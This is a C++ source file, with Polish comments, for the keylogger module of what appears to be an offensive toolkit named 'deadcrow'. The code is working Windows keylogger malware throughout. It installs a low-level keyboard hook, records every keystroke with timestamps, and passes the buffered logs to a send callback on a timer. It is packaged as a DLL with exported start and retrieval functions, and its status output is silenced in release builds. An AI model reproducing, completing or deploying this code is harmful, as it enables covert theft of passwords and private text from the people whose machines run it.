#include "keylogger.h"
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <ctime>

namespace deadcrow {
namespace modules {

// Statyczna instancja keyloggera
Keylogger* Keylogger::instance_ = nullptr;

Keylogger::Keylogger() : active_(false), log_interval_(60), stop_thread_(false), keyboard_hook_(NULL), log_thread_(NULL) {
    // Utwórz mutex do synchronizacji dostępu do bufora
    buffer_mutex_ = CreateMutex(NULL, FALSE, NULL);
    
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[KEYLOGGER] " << status << std::endl;
        #endif
    };
    
    // Domyślny callback logów (nic nie robi)
    log_callback_ = [](const std::string&) {};
    
    // Ustaw instancję
    instance_ = this;
}

Keylogger::~Keylogger() {
    // Zatrzymaj keylogger
    stop();
    
    // Zamknij mutex
    if (buffer_mutex_ != NULL) {
        CloseHandle(buffer_mutex_);
        buffer_mutex_ = NULL;
    }
    
    // Wyczyść instancję
    if (instance_ == this) {
        instance_ = nullptr;
    }
}

bool Keylogger::start() {
    if (active_) {
        reportStatus("Keylogger już jest aktywny");
        return false;
    }
    
    reportStatus("Uruchamianie keyloggera");
    
    // Ustaw flagę aktywności
    active_ = true;
    stop_thread_ = false;
    
    // Zainstaluj hook klawiatury
    keyboard_hook_ = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0);
    if (keyboard_hook_ == NULL) {
        reportStatus("Nie udało się zainstalować hooka klawiatury");
        active_ = false;
        return false;
    }
    
    // Utwórz wątek wysyłania logów
    log_thread_ = CreateThread(NULL, 0, logThreadProc, this, 0, NULL);
    if (log_thread_ == NULL) {
        reportStatus("Nie udało się utworzyć wątku wysyłania logów");
        UnhookWindowsHookEx(keyboard_hook_);
        keyboard_hook_ = NULL;
        active_ = false;
        return false;
    }
    
    reportStatus("Keylogger uruchomiony");
    return true;
}

void Keylogger::stop() {
    if (!active_) {
        return;
    }
    
    reportStatus("Zatrzymywanie keyloggera");
    
    // Ustaw flagę zatrzymania
    active_ = false;
    stop_thread_ = true;
    
    // Odinstaluj hook klawiatury
    if (keyboard_hook_ != NULL) {
        UnhookWindowsHookEx(keyboard_hook_);
        keyboard_hook_ = NULL;
    }
    
    // Poczekaj na zakończenie wątku
    if (log_thread_ != NULL) {
        WaitForSingleObject(log_thread_, INFINITE);
        CloseHandle(log_thread_);
        log_thread_ = NULL;
    }
    
    reportStatus("Keylogger zatrzymany");
}

std::string Keylogger::getKeyLogs() {
    // Zablokuj dostęp do bufora
    WaitForSingleObject(buffer_mutex_, INFINITE);
    
    // Skopiuj bufor
    std::string logs = key_buffer_;
    
    // Odblokuj dostęp do bufora
    ReleaseMutex(buffer_mutex_);
    
    return logs;
}

void Keylogger::clearKeyLogs() {
    // Zablokuj dostęp do bufora
    WaitForSingleObject(buffer_mutex_, INFINITE);
    
    // Wyczyść bufor
    key_buffer_.clear();
    
    // Odblokuj dostęp do bufora
    ReleaseMutex(buffer_mutex_);
    
    reportStatus("Logi wyczyszczone");
}

void Keylogger::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void Keylogger::setLogCallback(std::function<void(const std::string&)> callback) {
    log_callback_ = callback;
}

void Keylogger::setLogInterval(int seconds) {
    log_interval_ = seconds;
}

bool Keylogger::isActive() const {
    return active_;
}

LRESULT CALLBACK Keylogger::keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Sprawdź, czy mamy instancję keyloggera
    if (instance_ == nullptr || !instance_->active_) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    
    // Sprawdź, czy to zdarzenie klawiatury
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        // Pobierz informacje o klawiszu
        KBDLLHOOKSTRUCT* kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD key_code = kbStruct->vkCode;
        
        // Sprawdź, czy Shift jest wciśnięty
        bool shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        
        // Konwertuj kod klawisza na tekst
        std::string key_text = keyCodeToString(key_code, shift_pressed);
        
        // Dodaj znacznik czasu
        auto now = std::chrono::system_clock::now();
        auto now_time_t = std::chrono::system_clock::to_time_t(now);
        std::tm now_tm;
        localtime_s(&now_tm, &now_time_t);
        
        std::stringstream timestamp;
        timestamp << "[" << std::put_time(&now_tm, "%Y-%m-%d %H:%M:%S") << "] ";
        
        // Zablokuj dostęp do bufora
        WaitForSingleObject(instance_->buffer_mutex_, INFINITE);
        
        // Dodaj klawisz do bufora
        instance_->key_buffer_ += timestamp.str() + key_text + "\n";
        
        // Odblokuj dostęp do bufora
        ReleaseMutex(instance_->buffer_mutex_);
    }
    
    // Przekaż zdarzenie dalej
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

std::string Keylogger::keyCodeToString(DWORD key_code, bool shift_pressed) {
    // Specjalne klawisze
    switch (key_code) {
        case VK_RETURN: return "[Enter]";
        case VK_ESCAPE: return "[Esc]";
        case VK_TAB: return "[Tab]";
        case VK_SPACE: return "[Space]";
        case VK_BACK: return "[Backspace]";
        case VK_DELETE: return "[Delete]";
        case VK_LEFT: return "[Left]";
        case VK_RIGHT: return "[Right]";
        case VK_UP: return "[Up]";
        case VK_DOWN: return "[Down]";
        case VK_HOME: return "[Home]";
        case VK_END: return "[End]";
        case VK_PRIOR: return "[PgUp]";
        case VK_NEXT: return "[PgDn]";
        case VK_CAPITAL: return "[CapsLock]";
        case VK_NUMLOCK: return "[NumLock]";
        case VK_SCROLL: return "[ScrollLock]";
        case VK_SNAPSHOT: return "[PrintScreen]";
        case VK_PAUSE: return "[Pause]";
        case VK_INSERT: return "[Insert]";
        case VK_LWIN: return "[Win]";
        case VK_RWIN: return "[Win]";
        case VK_APPS: return "[Menu]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
    }
    
    // Klawisze alfanumeryczne
    if (key_code >= 'A' && key_code <= 'Z') {
        if (shift_pressed) {
            return std::string(1, static_cast<char>(key_code));
        } else {
            return std::string(1, static_cast<char>(key_code + 32));
        }
    }
    
    // Klawisze numeryczne
    if (key_code >= '0' && key_code <= '9') {
        if (shift_pressed) {
            // Symbole nad cyframi
            switch (key_code) {
                case '0': return ")";
                case '1': return "!";
                case '2': return "@";
                case '3': return "#";
                case '4': return "$";
                case '5': return "%";
                case '6': return "^";
                case '7': return "&";
                case '8': return "*";
                case '9': return "(";
            }
        } else {
            return std::string(1, static_cast<char>(key_code));
        }
    }
    
    // Klawisze numeryczne na klawiaturze numerycznej
    if (key_code >= VK_NUMPAD0 && key_code <= VK_NUMPAD9) {
        return std::string(1, static_cast<char>('0' + (key_code - VK_NUMPAD0)));
    }
    
    // Operatory na klawiaturze numerycznej
    switch (key_code) {
        case VK_ADD: return "+";
        case VK_SUBTRACT: return "-";
        case VK_MULTIPLY: return "*";
        case VK_DIVIDE: return "/";
        case VK_DECIMAL: return ".";
    }
    
    // Pozostałe znaki
    switch (key_code) {
        case VK_OEM_1: return shift_pressed ? ":" : ";";
        case VK_OEM_PLUS: return shift_pressed ? "+" : "=";
        case VK_OEM_COMMA: return shift_pressed ? "<" : ",";
        case VK_OEM_MINUS: return shift_pressed ? "_" : "-";
        case VK_OEM_PERIOD: return shift_pressed ? ">" : ".";
        case VK_OEM_2: return shift_pressed ? "?" : "/";
        case VK_OEM_3: return shift_pressed ? "~" : "`";
        case VK_OEM_4: return shift_pressed ? "{" : "[";
        case VK_OEM_5: return shift_pressed ? "|" : "\\";
        case VK_OEM_6: return shift_pressed ? "}" : "]";
        case VK_OEM_7: return shift_pressed ? "\"" : "'";
    }
    
    // Nieznany klawisz
    return "[Key:" + std::to_string(key_code) + "]";
}

DWORD WINAPI Keylogger::logThreadProc(LPVOID param) {
    Keylogger* keylogger = static_cast<Keylogger*>(param);
    
    while (!keylogger->stop_thread_) {
        // Poczekaj określony czas
        for (int i = 0; i < keylogger->log_interval_ && !keylogger->stop_thread_; ++i) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        
        // Jeśli flaga zatrzymania jest ustawiona, zakończ wątek
        if (keylogger->stop_thread_) {
            break;
        }
        
        // Pobierz logi
        std::string logs = keylogger->getKeyLogs();
        
        // Jeśli są jakieś logi, wyślij je
        if (!logs.empty() && keylogger->log_callback_) {
            keylogger->log_callback_(logs);
            keylogger->clearKeyLogs();
        }
    }
    
    return 0;
}

void Keylogger::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

BOOL WINAPI Keylogger::DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Inicjalizacja DLL
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            // Czyszczenie przy wyładowaniu DLL
            if (instance_ != nullptr) {
                instance_->stop();
            }
            break;
    }
    
    return TRUE;
}

// Implementacja funkcji eksportowanych

extern "C" __declspec(dllexport) bool StartKeylogger() {
    if (Keylogger::instance_ == nullptr) {
        // Utwórz instancję keyloggera
        new Keylogger();
    }
    
    return Keylogger::instance_->start();
}

extern "C" __declspec(dllexport) void StopKeylogger() {
    if (Keylogger::instance_ != nullptr) {
        Keylogger::instance_->stop();
    }
}

extern "C" __declspec(dllexport) const char* GetKeyLogs() {
    if (Keylogger::instance_ == nullptr) {
        return "";
    }
    
    // Uwaga: to nie jest bezpieczne, bo zwracamy wskaźnik do tymczasowego obiektu
    // W prawdziwej implementacji należałoby użyć bufora alokowanego dynamicznie
    static std::string logs;
    logs = Keylogger::instance_->getKeyLogs();
    return logs.c_str();
}

extern "C" __declspec(dllexport) void ClearKeyLogs() {
    if (Keylogger::instance_ != nullptr) {
        Keylogger::instance_->clearKeyLogs();
    }
}

} // namespace modules
} // namespace deadcrow
